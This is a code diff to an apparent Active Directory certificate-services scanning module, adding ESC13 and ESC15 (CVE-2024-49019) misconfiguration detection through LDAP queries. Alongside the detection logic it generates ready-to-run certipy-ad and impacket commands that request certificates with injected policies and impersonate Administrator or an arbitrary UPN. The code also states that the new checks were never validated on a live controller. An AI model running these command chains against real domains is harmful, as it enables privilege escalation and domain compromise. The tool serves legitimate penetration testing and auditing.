@@ -1,6 +1,6 @@
 """
 ADCS module — Active Directory Certificate Services enumeration.
-Detects ESC1-ESC4, ESC6-ESC9 misconfigurations.
+Detects ESC1-ESC4, ESC6-ESC9, ESC13 and ESC15 misconfigurations.
 
 ESC1  — Enrollee supplies Subject (SAN) + Client Auth EKU
 ESC2  — Any Purpose EKU (or no EKU) — can act as any cert
@@ -15,15 +15,33 @@ ESC8  — Web enrollment (/certsrv/) reachable with NTLM — actively probed ove
         HTTP/HTTPS, plus AD-declared msPKI-Enrollment-Servers as a hint.
 ESC9  — Template sets NoSecurityExtension (szOID SID binding omitted) on an
         authentication template → weak-mapping impersonation.
+ESC13 — Template carries an issuance policy (msPKI-Certificate-Policy) whose OID
+        object is linked to an AD group via msDS-OIDToGroupLink. Enrolling (when
+        the template also allows client auth) puts the linked group's SID in the
+        PKINIT PAC → membership without ever joining the group.
+ESC15 — EKUwu (CVE-2024-49019): a schema V1 template where the enrollee supplies
+        the subject. V1 templates copy an attacker-supplied Application Policies
+        extension from the CSR, so a Client-Auth (or Cert-Request-Agent) policy
+        can be injected into a cert whose nominal EKU forbids it.
 
-Not covered: ESC5, ESC10-ESC16.
+Not covered: ESC5, ESC10-ESC12, ESC14, ESC16.
+
+⚠️ NOT VALIDATED LIVE: ESC13 and ESC15 (added in v2.4.0) were implemented and
+   unit-tested against mocked records, but never run against a real DC with a
+   genuine ESC13/ESC15 misconfiguration. Before trusting a (non-)finding,
+   confirm the ESC13 OID-container read filter
+   (&(objectClass=msPKI-Enterprise-Oid)(msDS-OIDToGroupLink=*)) and the ESC15
+   schema-version gate against certipy's output on a live target.
 """
 
 import struct
 from modules.base import BaseModule, ScanContext
 from core.output import Severity, C, highlight_command
 from utils.ldap_helpers import get_attr, get_int, get_list, get_raw
-from utils.sids import resolve_sid, bytes_to_sid, is_privileged_sid
+from utils.sids import (
+    resolve_sid, bytes_to_sid, is_privileged_sid, is_high_value_sid,
+)
+from utils.ldap_helpers import SCOPE_BASE
 
 # EKU OIDs
 EKU_CLIENT_AUTH      = "1.3.6.1.5.5.7.3.2"
@@ -98,6 +116,7 @@ _TEMPLATE_ATTRS = [
     "pkiExpirationPeriod",
     "msPKI-Template-Schema-Version",
     "msPKI-Certificate-Application-Policy",
+    "msPKI-Certificate-Policy",            # ESC13: issuance-policy OIDs
 ]
 
 _CA_ATTRS = [
@@ -277,12 +296,66 @@ def _template_enrollees(entry, domain_sid: str, actionable_sids=frozenset()):
 
 
 # -----------------------------------------------------------------------
+# ESC13 — issuance-policy OID → AD group map
+# -----------------------------------------------------------------------
+
+def _resolve_group_dn(ctx, group_dn: str):
+    """Resolve a group DN to (sid_str, display_name) via a base-scope read.
+
+    Falls back to the DN's leading CN when the object can't be read (e.g. the
+    link points outside the readable tree).
+    """
+    cn = group_dn.split(",")[0].split("=")[-1] if group_dn else ""
+    try:
+        entries = ctx.conn.search(
+            "(objectClass=*)", ["objectSid", "sAMAccountName", "cn"],
+            base=group_dn, scope=SCOPE_BASE,
+        )
+    except Exception:
+        entries = []
+    if not entries:
+        return "", cn
+    raw  = get_raw(entries[0], "objectSid")
+    sid  = bytes_to_sid(raw) if raw else ""
+    name = get_attr(entries[0], "sAMAccountName") or get_attr(entries[0], "cn") or cn
+    return sid, name
+
+
+def _build_oid_group_map(ctx, config_dn: str) -> dict:
+    """Map an issuance-policy OID → (group_dn, group_sid, group_name).
+
+    ESC13: an msPKI-Enterprise-Oid object carrying msDS-OIDToGroupLink ties a
+    certificate-issuance policy to an AD group. A template that references that
+    OID in msPKI-Certificate-Policy confers the group's membership (via the
+    PKINIT PAC) on anyone who enrols. Only OIDs with a group link are returned.
+    """
+    oid_container = f"CN=OID,CN=Public Key Services,CN=Services,{config_dn}"
+    try:
+        entries = ctx.conn.search(
+            "(&(objectClass=msPKI-Enterprise-Oid)(msDS-OIDToGroupLink=*))",
+            ["msPKI-Cert-Template-OID", "msDS-OIDToGroupLink", "displayName", "name"],
+            base=oid_container,
+        )
+    except Exception:
+        return {}
+    mapping = {}
+    for e in entries:
+        oid      = get_attr(e, "msPKI-Cert-Template-OID")
+        group_dn = get_attr(e, "msDS-OIDToGroupLink")
+        if not oid or not group_dn:
+            continue
+        gsid, gname = _resolve_group_dn(ctx, group_dn)
+        mapping[oid] = (group_dn, gsid, gname)
+    return mapping
+
+
+# -----------------------------------------------------------------------
 # Module
 # -----------------------------------------------------------------------
 
 class ADCSModule(BaseModule):
     name        = "adcs"
-    description = "ADCS PKI enumeration and ESC1-ESC8 misconfiguration detection"
+    description = "ADCS PKI enumeration and ESC1-ESC9/ESC13/ESC15 misconfiguration detection"
 
     def run(self, ctx: ScanContext) -> None:
         out = ctx.out
@@ -333,6 +406,11 @@ class ADCSModule(BaseModule):
         esc3, esc3_info = [], []
         esc4 = []
         esc9, esc9_info = [], []
+        esc13, esc13_info = [], []
+        esc15, esc15_info = [], []
+
+        # ESC13: issuance-policy OID → linked AD group (one directory read).
+        oid_group_map = _build_oid_group_map(ctx, config_dn)
 
         # Identity-relative exploitability: SIDs the authenticated user holds.
         cur_sids = ctx.current_user_sids
@@ -346,6 +424,8 @@ class ADCSModule(BaseModule):
             ekus        = get_list(entry, "pKIExtendedKeyUsage")
             app_policies = get_list(entry, "msPKI-Certificate-Application-Policy")
             all_ekus    = ekus + app_policies
+            schema_ver  = get_int(entry, "msPKI-Template-Schema-Version")
+            cert_policies = get_list(entry, "msPKI-Certificate-Policy")
 
             # Only consider templates published by at least one CA
             is_published = tname.lower() in published_templates
@@ -432,11 +512,60 @@ class ADCSModule(BaseModule):
                 }
                 (esc9 if low_priv else esc9_info).append(record)
 
+            # ESC13: template references an issuance-policy OID that is linked to
+            # an AD group (msDS-OIDToGroupLink). Enrolling in an auth-capable
+            # template puts the linked group's SID in the PKINIT PAC.
+            # ⚠️ NOT VALIDATED LIVE (v2.4.0) — only unit-tested on mocked records;
+            #    never confirmed against a real ESC13-misconfigured DC.
+            if (
+                is_published
+                and no_approval
+                and _eku_allows_auth(all_ekus)
+                and cert_policies
+            ):
+                linked = [(oid, oid_group_map[oid])
+                          for oid in cert_policies if oid in oid_group_map]
+                if linked:
+                    enrollees, low_priv = _template_enrollees(entry, ctx.domain_sid, cur_sids)
+                    record = {
+                        "name":      display,
+                        "cn":        tname,
+                        "ekus":      ", ".join(all_ekus[:2]),
+                        "enrollees": enrollees,
+                        "low_priv":  low_priv,
+                        "groups":    [g for (_oid, g) in linked],   # (dn, sid, name)
+                    }
+                    (esc13 if low_priv else esc13_info).append(record)
+
+            # ESC15 (EKUwu, CVE-2024-49019): schema V1 template where the enrollee
+            # supplies the subject. V1 templates copy an attacker-controlled
+            # Application Policies extension from the CSR → inject Client Auth
+            # (or Cert-Request-Agent) into a cert whose nominal EKU forbids it.
+            # ⚠️ NOT VALIDATED LIVE (v2.4.0) — only unit-tested on mocked records;
+            #    never confirmed against a real ESC15-misconfigured DC.
+            if (
+                is_published
+                and no_approval
+                and ra_sig == 0
+                and schema_ver in (0, 1)       # V1 (0 = attribute absent on legacy V1)
+                and (name_flags & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
+            ):
+                enrollees, low_priv = _template_enrollees(entry, ctx.domain_sid, cur_sids)
+                record = {
+                    "name":      display,
+                    "cn":        tname,
+                    "ekus":      ", ".join(all_ekus[:2]) or "(none)",
+                    "enrollees": enrollees,
+                    "low_priv":  low_priv,
+                }
+                (esc15 if low_priv else esc15_info).append(record)
+
         # ---- Attach copy-pasteable commands (from enumeration data) ----
         ca_name = get_attr(ca_entries[0], "name") if ca_entries else "<CA>"
         ca_host = get_attr(ca_entries[0], "dNSHostName") if ca_entries else ""
         for esc_id, items in (("ESC1", esc1), ("ESC2", esc2),
-                              ("ESC3", esc3), ("ESC9", esc9)):
+                              ("ESC3", esc3), ("ESC9", esc9),
+                              ("ESC13", esc13), ("ESC15", esc15)):
             for rec in items:
                 self._attach_cmd(ctx, esc_id, rec, ca_name, ca_host)
 
@@ -468,6 +597,26 @@ class ADCSModule(BaseModule):
             Severity.HIGH)
         self._report_esc_info(ctx, "ESC9", esc9_info)
 
+        # ESC13 severity rises to CRITICAL when any linked group is privileged.
+        esc13_sev = Severity.CRITICAL if any(
+            is_high_value_sid(s, ctx.domain_sid) or is_privileged_sid(s, ctx.domain_sid)
+            for rec in esc13 for (_d, s, _n) in rec.get("groups", [])
+        ) else Severity.HIGH
+        self._report_esc(ctx, "ESC13", esc13,
+            "Issuance Policy linked to an AD group (OIDToGroupLink)",
+            "Certificates from this template confer membership of the linked AD "
+            "group via the PKINIT PAC — privilege escalation without joining it.",
+            esc13_sev)
+        self._report_esc_info(ctx, "ESC13", esc13_info)
+
+        self._report_esc(ctx, "ESC15", esc15,
+            "EKUwu — schema V1 template, enrollee supplies subject (CVE-2024-49019)",
+            "V1 templates copy an attacker-supplied Application Policies extension "
+            "from the CSR. Inject Client Authentication (or Certificate Request "
+            "Agent) to turn this cert into an auth cert for an arbitrary UPN.",
+            Severity.CRITICAL)
+        self._report_esc_info(ctx, "ESC15", esc15_info)
+
         if esc4:
             out.subsection("ESC4 — Dangerous Template ACL")
             for t in esc4:
@@ -483,7 +632,8 @@ class ADCSModule(BaseModule):
             )
 
         if not (esc1 or esc1_info or esc2 or esc2_info or esc3 or esc3_info
-                or esc4 or esc9 or esc9_info):
+                or esc4 or esc9 or esc9_info or esc13 or esc13_info
+                or esc15 or esc15_info):
             out.success("No template ESC misconfigurations detected on published templates")
 
     def _show_ca(self, ctx: ScanContext, ca_entry, config_dn: str) -> None:
@@ -764,6 +914,36 @@ class ADCSModule(BaseModule):
                 f"# If RPC is filtered — Kerberos (add: {kinit} ; then "
                 f"-k -no-pass -target '{ca_host}' -ns {dc} -dns-tcp to each req)"
             )
+        elif esc_id == "ESC13":
+            grp = ", ".join(n for (_d, _s, n) in rec.get("groups", [])) or "<linked group>"
+            pfx = (user.lower() or "<user>") + ".pfx"
+            rec["cmd"] = (
+                f"certipy-ad req {auth} -ca '{ca_name}' -template '{cn}'   "
+                f"# issued cert carries the OID-linked group\n"
+                f"certipy-ad auth -pfx {pfx} -dc-ip {dc}   "
+                f"# PKINIT PAC now grants: {grp}\n"
+                f"# No SAN needed — the issuance policy confers membership of "
+                f"{grp} on any enrollee."
+            )
+        elif esc_id == "ESC15":
+            kinit = (f"impacket-getTGT {domain}/{user}:'{pw}' -dc-ip {dc} && "
+                     f"export KRB5CCNAME={user}.ccache") if pw else \
+                    "# KRB5CCNAME already set"
+            rec["cmd"] = (
+                "# EKUwu (CVE-2024-49019): inject an Application Policy into a V1 template.\n"
+                "# Scenario A — direct impersonation (inject Client Authentication):\n"
+                f"certipy-ad req {auth} -ca '{ca_name}' -template '{cn}' "
+                f"-upn '{upn}' -sid '<target-SID>' "
+                f"-application-policies 'Client Authentication'\n"
+                f"certipy-ad auth -pfx administrator.pfx -dc-ip {dc}\n"
+                "# Scenario B — inject Certificate Request Agent, then enroll on-behalf-of (ESC3-style):\n"
+                f"certipy-ad req {auth} -ca '{ca_name}' -template '{cn}' "
+                f"-application-policies 'Certificate Request Agent'\n"
+                f"certipy-ad req {auth} -ca '{ca_name}' -template User "
+                f"-pfx <agent>.pfx -on-behalf-of '{nb}\\Administrator'\n"
+                f"# If RPC is filtered — Kerberos: {kinit} ; then add "
+                f"-k -no-pass -target '{ca_host}' -ns {dc} -dns-tcp"
+            )
 
     @staticmethod
     def _report_esc(ctx, esc_id: str, items: list, title: str, detail: str,
@@ -776,6 +956,10 @@ class ADCSModule(BaseModule):
             print(f"    {C.YELLOW}{C.BOLD}{item['name']}{C.RESET}")
             if item.get("ekus"):
                 out.kv("    EKUs", item["ekus"], indent=6)
+            if item.get("groups"):
+                out.kv("    Grants group",
+                       ", ".join(f"{n} ({s or '?'})" for (_d, s, n) in item["groups"]),
+                       indent=6)
             if item.get("low_priv"):
                 out.kv("    Enrollable by", ", ".join(item["low_priv"]), indent=6)
             elif item.get("enrollees"):
